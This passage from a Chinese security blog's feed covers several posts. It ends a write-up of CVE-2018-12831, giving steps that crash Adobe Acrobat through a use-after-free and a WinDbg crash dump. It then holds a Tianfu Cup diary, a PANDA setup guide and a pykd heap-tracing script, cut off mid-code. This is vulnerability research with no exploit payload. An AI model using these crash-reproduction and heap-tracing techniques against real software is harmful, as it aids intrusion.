<p>脚本来自网上，当时晚上随便看reader攻击面的时候随手找到的一个转换脚本，这个脚本的功能的调用<code>Adobe Acrobat DC Pro</code>的转换模块，把pdf转成图片。</p>
<p>其实脚本看起来没有任何问题，而且我使用的<code>x.pdf</code>也没有什么特殊支持，随便一个pdf文件都可以触发这个洞。问题不在于内存，在于逻辑。</p>
<h5 id="触发漏洞"><a href="#触发漏洞" class="headerlink" title="触发漏洞"></a>触发漏洞</h5><ol>
<li>第一次运行<code>vbs</code>脚本启动转换，此时没有任何问题，这时候不要kill掉<code>Acrobat.exe</code>。</li>
<li>然后再次运行<code>vbs</code>脚本，因为<code>Reader</code>是单进程的，多的tab标签会以单独的线程体现，所以这个时候你不会看到第二次被打开的文件。</li>
<li>关闭已打开的pdf标签</li>
<li>crash</li>
</ol>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">0:029&gt; g</span><br><span class="line">(874.74c): Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">*** ERROR: Symbol file could not be found. Defaulted to <span class="built_in">export</span> symbols <span class="keyword">for</span> Acrobat.dll -</span><br><span class="line">Acrobat_6c400000!DllCanUnloadNow+0x591d3:</span><br><span class="line">6c4d7318 8b4118 mov eax,dword ptr [ecx+18h] ds:002b:2b208bb0=?? ??????</span><br><span class="line">0:000:x86&gt; r</span><br><span class="line">eax=2b208b98 ebx=00000001 ecx=2b208b98 edx=03c51138 esi=2b96edb0 edi=0000000 1</span><br><span class="line">eip=6c4d7318 esp=0021f308 ebp=0021f308 iopl=0</span><br><span class="line">c</span><br><span class="line">cs=0023 ss=002b ds=002b es=002b fs=0053 gs=002b</span><br><span class="line">2</span><br><span class="line">Acrobat_6c400000!DllCanUnloadNow+0x591d3:</span><br><span class="line">6c4d7318 8b4118 mov eax,dword ptr [ecx+18h] ds:002b:2b208bb0=??</span><br><span class="line">??????</span><br><span class="line">0:000:x86&gt; dd ecx</span><br><span class="line">2b208b98  ???????? ???????? ???????? ????????</span><br><span class="line">2b208ba8  ???????? ???????? ???????? ????????</span><br><span class="line">2b208bb8  ???????? ???????? ???????? ????????</span><br><span class="line">2b208bc8  ???????? ???????? ???????? ????????</span><br><span class="line">2b208bd8  ???????? ???????? ???????? ????????</span><br><span class="line">2b208be8  ???????? ???????? ???????? ????????</span><br><span class="line">2b208bf8  ???????? ???????? ???????? ????????</span><br><span class="line">2b208c08  ???????? ???????? ???????? ????????</span><br></pre></td></tr></table></figure>
<p>具体的漏洞分析的细节不再细述，逆向的工作量比较大，主要是管理PDDoc对象的问题。当时厂商也说这个问题好像有点复杂，他们需要做更多的测试工作，所以差不多从五月报告，到修复，我等了差不多四五个月的样子:( </p>
<h4 id="0x02-类似的情况"><a href="#0x02-类似的情况" class="headerlink" title="0x02 : 类似的情况"></a>0x02 : 类似的情况</h4><p>很有意思的是，我在<code>Adobe Reader</code>系列、<code>Foxit</code>都发现过类似的情况，正常的文件，但是操作逻辑不正常，导致下层代码产生崩溃，比如一些数据不同步的情况(Foixt的一个洞)。</p>
<p>还有就是SourceTree的Windows版也有这样的问题，但是是个空指针，没人理吧估计。 就是在进行配置的时候，不按照他指示的逻辑向下进行，就会触发这个空指针。(依然没有修复，发了邮件也不理 T_T)</p>
<p>本月(2018.12)我又交了一个<code>Adobe Acrobat DC Pro</code>的越界读，也是这种类似的漏洞(鸡肋又没用)，完全正常的代码、文件，只是因为操作逻辑不对导致了程序崩溃。说实话我也不是很明白为什么会出现这么奇怪的<code>bug</code>，我每次都是在找攻击面、测试自己写的东西的时候发现的这些奇怪的bug。</p>
<h4 id="0x03-引发的一点思考"><a href="#0x03-引发的一点思考" class="headerlink" title="0x03 : 引发的一点思考"></a>0x03 : 引发的一点思考</h4><p>在程序的复杂度剧增的现在，用了很多设计模式、框架糅合的程序的确很难保证没有类似的bug出现，比如Adobe这种支持很多功能、插件的PDF阅读器，在逆向的时候就发现了一层又一层的封装以及一些设计模式，搞得人一个头两个大。</p>
<p>上层的操作逻辑对下层代码的影响有时候真的很难考虑周全，或者说测试的时候也没往这个方向想，所以导致一些bug的出现，不过我估计除了安全研究员也没人去往这个方向搞 :(   我个人也没有什么开发相关的经验，就存在一个疑问:这部分问题怎么避免or及早发现? </p>
<p>最近也看到James的几个本地提权的洞，不由感叹逻辑洞是真牛逼，以后还是要多往这个方向想想。不过像Reader这种思路逻辑洞就只在穿sanbox的时候有见过？ 至今还记得zdi之前一波利用 <code>__defGetter__</code>和<code>__defSetter__</code>调用到特权api的那套骚操作…不过也被封的差不多了，基本gg :( </p>
<p>最后吐槽一下，洞好难挖…</p>
<h4 id="0x04-其他人的工作"><a href="#0x04-其他人的工作" class="headerlink" title="0x04 : 其他人的工作"></a>0x04 : 其他人的工作</h4><p><code>QuBo</code> &amp;&amp; <code>heige</code> 在kcon2018上的议题涉及到了一小部分这样的，只是他们做的更完善，在fuzz内存破坏漏洞、加入了操作逻辑的fuzz，就产生了一些很奇怪的case，比如点击xx下崩溃，以xx分辨率打开然后xxx崩溃…</p>
<p>很有意思的分享，虽然这类洞利用的可能性微乎其微（个人认为没有），但是很有趣，也是枯燥的漏洞挖掘生活中的一丝乐趣。</p>
<h4 id="0x05-致谢信息"><a href="#0x05-致谢信息" class="headerlink" title="0x05 : 致谢信息"></a>0x05 : 致谢信息</h4><p><a href="https://helpx.adobe.com/security/products/acrobat/apsb18-30.html" target="_blank" rel="noopener">Zhenjie Jia of Qihoo 360 Vulcan Team (CVE-2018-12831) </a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 : 前言&quot;&gt;&lt;/a&gt;0x00 : 前言&lt;/h4&gt;&lt;p&gt;这是一个很奇怪的case，在我还在学校的时候对Adobe Reader日常逆向的时候意外发现的一个UAF漏洞，很不幸的是无法利用；但是有趣的是他的触发方式，在后面的工作中，我在Foxit中意外发现了类似的问题，就在昨天，Adobe更新最新补丁之后，也发现了一个类似的UAF(0day,已提交给厂商)，这个0day不在本文讨论范围之内。&lt;/p&gt;
    
    </summary>
    
    
      <category term="CVE" scheme="http://o0xmuhe.me/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>TFC游记</title>
    <link href="http://o0xmuhe.me/2018/11/18/TFC%E6%B8%B8%E8%AE%B0/"/>
    <id>http://o0xmuhe.me/2018/11/18/TFC游记/</id>
    <published>2018-11-18T14:02:04.000Z</published>
    <updated>2018-11-18T15:17:22.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x00-：前言"><a href="#0x00-：前言" class="headerlink" title="0x00 ：前言"></a>0x00 ：前言</h4><p>很幸运能随团队一起参加中国版pwn2own–天府杯国际破解大赛。对于我这样一个刚毕业几个月的菜鸟来说，真的是见了大世面，也从这个经历、随行的同事身上学到了很多东西，对于自己而言，我认为这次经历是加速自身成长的神奇药剂。</p>
<a id="more"></a>
<h4 id="0x01-：赶赴成都"><a href="#0x01-：赶赴成都" class="headerlink" title="0x01 ：赶赴成都"></a>0x01 ：赶赴成都</h4><p>11月15日跟随大部队乘坐早上7:45的飞机从北京赶往成都，正好前一天北京雾霾严重，可以说是去蓉城躲一躲了 23333。</p>
<p>作为一个菜鸟，跟着大佬们就对了，到了成都之后，吃完午饭大家就快速赶往了赛场做前期准备工作，比如环境的查看工作。  不得不说，会场真的太太太太太太太太大了，酒店距离会场真的太远了，16km简直是噩梦，太不方便了。</p>
<p>晚上回到酒店后，在古先生的带领下大家去吃了跷脚牛肉，在北京待得时间长了，大家都吃不了太辣。 我还是个愣头青，我觉得我才从成都过去几个月，我应该可以，结果晚上睡觉的时候，胃里热辣辣的感觉告诉我，too young啊少年。</p>
<h4 id="0x02-：-比赛日-day1"><a href="#0x02-：-比赛日-day1" class="headerlink" title="0x02 ： 比赛日 day1"></a>0x02 ： 比赛日 day1</h4><p>因为是破解大赛，大家都是揣着0day(s)来到会场的，古先生再三提醒，千万看好自己的包、电脑，互相帮忙看住。那段时间感觉警惕性达到顶峰，一个声称自己是360市场部的同事来坐到我们桌子这边时候，我第一反应是怀疑他到底是不是真的，有啥目的😢。</p>
<p>早上9:30开始的是重头戏，抽签。老早就听说，这种比赛最重要的就是抽签，签序能影响很多，但是前提是：你必须有足够的储备，你必须有足够的储备，你必须有足够的储备。</p>
<p>因为策略，男哥、我、团队，我们报了三个PDF项目，没想到似乎是微博抽奖的锦鲤属性，我PDF抽到第一个，团队的是第二个（这个时候感觉自己在做梦…这也太棒了吧！)。不得不说，day1真的是我们的幸运日，几乎所有大项都抽到了第一个，只有龚神的一个小米8排到了最后 :( </p>
<p>我们团队从edge开始打，毫无悬念的一次通；然后是龚神的Chrome，一次就成，太强了；之后我跟着男哥去打了PDF，从杨博士双击1.pdf那个文件开始，呼吸加速，默默祈求着calc你快出来，reader卡了几秒之后，calc直接弹出，破解成功！之后就是和厂商、内场裁判一起review了，确定你的漏洞真实有效。这个过程有点漫长，adobe来的那个老哥貌似不是做技术的，验证了好久 :( 。 </p>
<p>之后团队的PDF也成功打下，龙哥的Safari也顺利拿下…后面肖伟哥和天文的VirtualBox、VMware顺利搞定。</p>
<p>男哥的PDF在day2，他紧急回酒店忙相关的事情。后面因为没我什么事我就先去和李专家(L3m0n)以及学弟吃晚饭了，火锅接近尾声的时候，男哥那边有些情况，我就直接打车回了酒店找他，希望可以帮上一些忙。 不得不说这次被出租车师傅坑了，不打表直接开价不说，中间还加了一次价格，我想看副驾上有啥信息，车牌、电话啥的，想投诉的时候缺发现啥也没有，遂放弃，还是赶紧回去找男哥汇合，别耽误正事。</p>
<h4 id="0x03-：-比赛日-day2"><a href="#0x03-：-比赛日-day2" class="headerlink" title="0x03 ： 比赛日 day2"></a>0x03 ： 比赛日 day2</h4><p>因为第一天奠定的巨大优势，没必要再浪费漏洞，就放弃了一些项目。就只有大宝师傅的Safari和iPhone x rjb。</p>
<p>大宝师傅打完之后，后面就没什么看的了，涅槃团队的Safari+穿sandbox，因为Safari撞洞，所以只有穿sandbox的分数，很可惜吧。</p>
<p>后面颁奖没啥好说的了，大宝师傅的优秀个人，天文的最牛技术，实至名归，都很厉害，都是我学习的榜样。 </p>
<h4 id="0x04-：一些感想"><a href="#0x04-：一些感想" class="headerlink" title="0x04 ：一些感想"></a>0x04 ：一些感想</h4><p>首先是陈少公开夸奖大宝。 这种无公司界限的纯技术上的赞赏，真的让人有种“英雄惜英雄”的感觉，虽然这句话不是很正确，但是总就感觉很棒。 我一直觉得，大宝师傅算是同龄人里的一个标杆，在安全研究上的工作，以及他的想法、态度，都值得我去学习。</p>
<p>我们小组流传着一句：寻找大师，追随大师，成为大师，超越大师，以及tk教主很早以前说的，在同龄人里找一个标杆，行业前辈中再找一个标杆（大概这样的意思吧），我认为综合起来，现在都找到了。希望在安全的道路上，可以早点看到前辈们的车尾灯，希望可以早点追赶上他们。</p>
<p>比赛结束就结束了，结束之后和男哥沟通了很多，不得不感叹工作后遇到男哥这样的导师真的是太幸运了，男哥真的是我的贵人。 后续的工作也有一个大概的规划了，以及对以后一个发展方向有了更清楚的认识，前辈们思考问题的维度、深度的确是高了几个层次，这些还需要慢慢学习。男哥说，安全这条路，你就算有天赋也要堆时间。这话很对，更何况我这样没有天赋的凡人，需要的不仅仅是时间，还有努力努力再努力 :) </p>
<p>至于赛场外的一些事，我觉得没什么好说的，团队里的大佬也没说什么，可能大家见得多了，已经很佛系了。</p>
<p>在我还在学校的时候，pwn2own还能参加的时候，从来没有听说过、看到过，360这边因为签序、撞洞的事各种diss，像是受了天大的委屈。签序只是运气问题，撞洞就是储备问题了，与他人无关。</p>
<p>至于你们说报名多队伍，第一，这完全在规则允许的范围之内，而且我们也没撞洞啥的；第二，这招谁开始玩的溜呢？ :)</p>
<p>这几天其实蛮精彩的，不过作为小菜鸟也不敢多说什么，只是发现，高级别的大佬之间，格局的差距原来可以这么大。</p>
<p>翻篇了翻篇了，该开始新的工作了，努力创造更多的价值，希望后面自己可以产出更多0day，更多exploit。</p>
<p><code>Live long and pwn</code></p>
<p>最后，放个图</p>
<p><img src="https://blogimg-10065924.cos.ap-shanghai.myqcloud.com/TFC/faker.jpg" alt="faker"></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0x00-：前言&quot;&gt;&lt;a href=&quot;#0x00-：前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 ：前言&quot;&gt;&lt;/a&gt;0x00 ：前言&lt;/h4&gt;&lt;p&gt;很幸运能随团队一起参加中国版pwn2own–天府杯国际破解大赛。对于我这样一个刚毕业几个月的菜鸟来说，真的是见了大世面，也从这个经历、随行的同事身上学到了很多东西，对于自己而言，我认为这次经历是加速自身成长的神奇药剂。&lt;/p&gt;
    
    </summary>
    
    
      <category term="感想" scheme="http://o0xmuhe.me/tags/%E6%84%9F%E6%83%B3/"/>
    
  </entry>
  
  <entry>
    <title>Hello PANDA</title>
    <link href="http://o0xmuhe.me/2018/11/08/Hello-PANDA/"/>
    <id>http://o0xmuhe.me/2018/11/08/Hello-PANDA/</id>
    <published>2018-11-08T04:15:43.000Z</published>
    <updated>2018-11-08T04:33:19.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0-Environment"><a href="#0-Environment" class="headerlink" title="0. Environment"></a>0. Environment</h4><p>Ubuntu16.04 x64</p>
<a id="more"></a>
<h4 id="1-Install-Panda"><a href="#1-Install-Panda" class="headerlink" title="1. Install Panda"></a>1. Install Panda</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/moyix/panda.git</span><br><span class="line"><span class="built_in">cd</span> panda</span><br><span class="line">./panda_install.bash</span><br></pre></td></tr></table></figure>
<h4 id="2-Working-Folder-and-HDD"><a href="#2-Working-Folder-and-HDD" class="headerlink" title="2. Working Folder and HDD"></a>2. Working Folder and HDD</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ mkdir my_first_panda</span><br><span class="line">$ <span class="built_in">cd</span> my_first_panda</span><br><span class="line">$ ../qemu/qemu-img create <span class="_">-f</span> qcow2 test.img 32G</span><br></pre></td></tr></table></figure>
<h4 id="3-Boot-VM"><a href="#3-Boot-VM" class="headerlink" title="3. Boot VM"></a>3. Boot VM</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../qemu/x86_64-softmmu/qemu-system-x86_64 test.img --monitor stdio -vnc 127.0.0.1:1 -k en-gb -m 1024</span><br></pre></td></tr></table></figure>
<p>you will get:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">➜  my_first_panda git:(master) ✗ ../qemu/x86_64-softmmu/qemu-system-x86_64 test.img --monitor stdio -vnc 127.0.0.1:1 -k en-gb -m 1024</span><br><span class="line"></span><br><span class="line">(process:21836): GLib-WARNING **: /build/glib2.0-7ZsPUq/glib2.0-2.48.2/./glib/gmem.c:483: custom memory allocation vtable not supported</span><br><span class="line">QEMU 1.0,1 monitor - <span class="built_in">type</span> <span class="string">'help'</span> <span class="keyword">for</span> more information</span><br><span class="line">(qemu) change ide1-cd0 win_server_2008_r2.iso </span><br><span class="line">(qemu)</span><br></pre></td></tr></table></figure>
<p>mount your iso file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(qemu) change ide1-cd0 win_server_2008_r2.iso </span><br><span class="line">(qemu)</span><br></pre></td></tr></table></figure>
<h4 id="4-Install-OS"><a href="#4-Install-OS" class="headerlink" title="4. Install OS"></a>4. Install OS</h4><p>Connect your vm with a VNC client, press <code>ctrl + opt + del</code>(on macOS) / <code>ctrl + alt + del</code>(on Windows) to reboot your vm,then you are able to install the OS.</p>
<h4 id="5-Record-Replay-with-PANDA"><a href="#5-Record-Replay-with-PANDA" class="headerlink" title="5. Record/Replay with PANDA"></a>5. Record/Replay with PANDA</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(qemu) begin_record <span class="built_in">test</span></span><br></pre></td></tr></table></figure>
<p>….</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(qemu) end_record</span><br></pre></td></tr></table></figure>
<p>now you can replay (with replay movie plugin)</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../qemu/x86_64-softmmu/qemu-system-x86_64 -replay <span class="built_in">test</span> -panda replaymovie -m 2048</span><br></pre></td></tr></table></figure>
<p>other plugins? Taint?cov?  :)</p>
<h4 id="6-Reference"><a href="#6-Reference" class="headerlink" title="6. Reference"></a>6. Reference</h4><p><a href="https://gist.github.com/bridgeythegeek/d7a6c449287c6e32187be2639a7920bf" target="_blank" rel="noopener">My first panda</a></p>
<p><a href="https://github.com/panda-re/panda/blob/master/panda/plugins/callstack_instr/USAGE.md" target="_blank" rel="noopener">Panda Usage</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;0-Environment&quot;&gt;&lt;a href=&quot;#0-Environment&quot; class=&quot;headerlink&quot; title=&quot;0. Environment&quot;&gt;&lt;/a&gt;0. Environment&lt;/h4&gt;&lt;p&gt;Ubuntu16.04 x64&lt;/p&gt;
    
    </summary>
    
    
      <category term="PANDA" scheme="http://o0xmuhe.me/tags/PANDA/"/>
    
      <category term="RE" scheme="http://o0xmuhe.me/tags/RE/"/>
    
  </entry>
  
  <entry>
    <title>UAF analysis : using pykd</title>
    <link href="http://o0xmuhe.me/2018/11/07/UAF-analysis-using-pykd/"/>
    <id>http://o0xmuhe.me/2018/11/07/UAF-analysis-using-pykd/</id>
    <published>2018-11-07T09:52:40.000Z</published>
    <updated>2018-11-07T10:05:16.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="0x01-简介"><a href="#0x01-简介" class="headerlink" title="0x01 : 简介"></a>0x01 : 简介</h4><p>分析一些情况比较复杂的UAF漏洞时，比如很多次分配、使用内存，费力寻找被UAF的对象的释放点，是比较麻烦的(对于我这种菜逼来说)，这时候可以使用pykd来辅助这个工作，能使得漏洞分析工作变得更轻松。 </p>
<a id="more"></a>
<h4 id="0x02-脚本模版"><a href="#0x02-脚本模版" class="headerlink" title="0x02 : 脚本模版"></a>0x02 : 脚本模版</h4><p>这个脚本的<a href="https://labs.mwrinfosecurity.com/blog/heap-tracing-with-windbg-and-python/" target="_blank" rel="noopener">原始版本</a>在使用的时候有点问题，我本地测试的时候回调函数有点问题，不能正常使用。</p>
<p>后来咨询了无言学长之后，学长帮忙做了修改:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pykd</span><br><span class="line"></span><br><span class="line">return_reg = <span class="string">"rax"</span></span><br><span class="line">stack_pointer = <span class="string">"rsp"</span></span><br><span class="line">arch_bits = <span class="number">64</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(localAddr)</span>:</span></span><br><span class="line">    res = pykd.dbgCommand(<span class="string">"x "</span> + localAddr)</span><br><span class="line">    result_count = res.count(<span class="string">"\n"</span>)</span><br><span class="line">    <span class="keyword">if</span> result_count == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">print</span> localAddr + <span class="string">" not found."</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line">    <span class="keyword">if</span> result_count &gt; <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[-] Warning, more than one result for"</span>, localAddr</span><br><span class="line">    <span class="keyword">return</span> res.split()[<span class="number">0</span>].replace(<span class="string">'`'</span>,<span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RtlAllocateHeap(</span></span><br><span class="line"><span class="comment"># IN PVOID                HeapHandle,</span></span><br><span class="line"><span class="comment"># IN ULONG                Flags,</span></span><br><span class="line"><span class="comment"># IN ULONG                Size );</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">handle_allocate_heap</span><span class="params">(pykd.eventHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        addr = get_address(<span class="string">"ntdll!RtlAllocateHeap"</span>)</span><br><span class="line">        <span class="keyword">if</span> addr == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.bp_init = pykd.setBp(int(addr, <span class="number">16</span>), self.enter_call_back)</span><br><span class="line">        self.bp_end = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enter_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.out = <span class="string">"RtlAllocateHeap("</span></span><br><span class="line">        <span class="keyword">if</span> arch_bits == <span class="number">32</span>:</span><br><span class="line">            esp = pykd.reg(stack_pointer)</span><br><span class="line">            self.out += hex(pykd.ptrPtr(esp + <span class="number">4</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrMWord(esp + <span class="number">0x8</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrMWord(esp + <span class="number">0xC</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rcx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rdx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"r8"</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">if</span> self.bp_end == <span class="keyword">None</span>:</span><br><span class="line">            disas = pykd.dbgCommand(<span class="string">"uf ntdll!RtlAllocateHeap"</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> disas:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'ret'</span> <span class="keyword">in</span> i:</span><br><span class="line">                    self.ret_addr = i.split()[<span class="number">0</span>].replace(<span class="string">'`'</span>,<span class="string">''</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            self.bp_end = pykd.setBp(int(self.ret_addr, <span class="number">16</span>), self.return_call_back)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">return_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        pykd.dprintln(self.out + hex(pykd.reg(return_reg)) + <span class="string">"\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># RtlFreeHeap(</span></span><br><span class="line"><span class="comment"># IN PVOID                HeapHandle,</span></span><br><span class="line"><span class="comment"># IN ULONG                Flags OPTIONAL,</span></span><br><span class="line"><span class="comment"># IN PVOID                MemoryPointer );</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">handle_free_heap</span><span class="params">(pykd.eventHandler)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        addr = get_address(<span class="string">"ntdll!RtlFreeHeap"</span>)</span><br><span class="line">        <span class="keyword">if</span> addr == <span class="keyword">None</span>:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.bp_init = pykd.setBp(int(addr, <span class="number">16</span>), self.enter_call_back)</span><br><span class="line">        self.bp_end = <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enter_call_back</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.out = <span class="string">"RtlFreeHeap("</span></span><br><span class="line">        <span class="keyword">if</span> arch_bits == <span class="number">32</span>:</span><br><span class="line">            esp = pykd.reg(stack_pointer)</span><br><span class="line">            self.out += hex(pykd.ptrPtr(esp + <span class="number">4</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrMWord(esp + <span class="number">0x8</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.ptrPtr(esp + <span class="number">0xC</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rcx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"rdx"</span>)) + <span class="string">" , "</span></span><br><span class="line">            self.out += hex(pykd.reg(<span class="string">"r8"</span>)) + <span class="string">") = "</span></span><br><span class="line">        <span class="keyword">if</span> self.bp_end == <span class="keyword">None</span>:</span><br><span class="line">            disas = pykd.dbgCommand(<span class="string">"uf ntdll!RtlFreeHeap"</span>).split(<span class="string">'\n'</span>)</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> disas:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">'ret'</span> <span class="keyword">in</span> i:</span><br><span class="line">                    self.ret_addr = i.split()[<span class="number">0</span>].replace(<span class="string">'`'</span>,<span class="string">''</span>)</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            self.bp_end = pykd.setBp(int(self.ret_addr, <span class="number">16</span>), 